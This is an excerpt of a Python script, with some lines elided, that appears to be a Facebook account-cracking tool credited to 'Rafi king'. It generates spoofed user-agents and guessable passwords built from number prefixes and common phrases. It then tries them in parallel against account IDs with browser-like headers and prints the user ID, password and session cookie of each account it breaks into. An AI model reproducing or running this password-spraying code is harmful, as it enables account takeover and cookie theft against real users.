...
for xd in range(10000):
    ...
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
os.system('xdg-open https://github.com/RCN-rocky')
logo = ("""\033[38;5;48m
...
\033[38;5;96m\033[47m B \x1b[0m\033[38;5;196m DEVELOPER   :   Rafi king 
\033[38;5;97m\033[47m O \x1b[0m\033[38;5;197m GITHUB      :   Rafi king 
...
class Main:
    def __init__(self):
        ...
        print("\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        Mumit =input("[?] Choose : ")
        os.system('xdg-open https://https://www.facebook.com/mdrafiulislam.rafi.58118')
        if Mumit in ["1", "01"]:
            num()
        if Mumit in ["2","02"]:
            gml()
...
def num():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        for guru in user:
            ...
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'free fire','I love u','@@##','123@@']
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mGift \033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
           ...
           'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5764.201", "Google Chrome";v="114.0.5764.201"',
           'sec-ch-ua-mobile': '?0',
           'sec-ch-ua-model': '""',
           ...
           'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[Gift-ok🌺] {uid} | {ps}")
                print(f"=[🍪]=\033[38;5;48m {coki}")
           ...
           # elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
               # print(f"\x1b[38;5;196m[Gift-cp] {cid} | {ps}")
                ...
                continue
        loop+=1
        #sys.stdout.write(f'\r\033[m[Gift ] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        #sys.stdout.flush()
    except:
        pass
Main()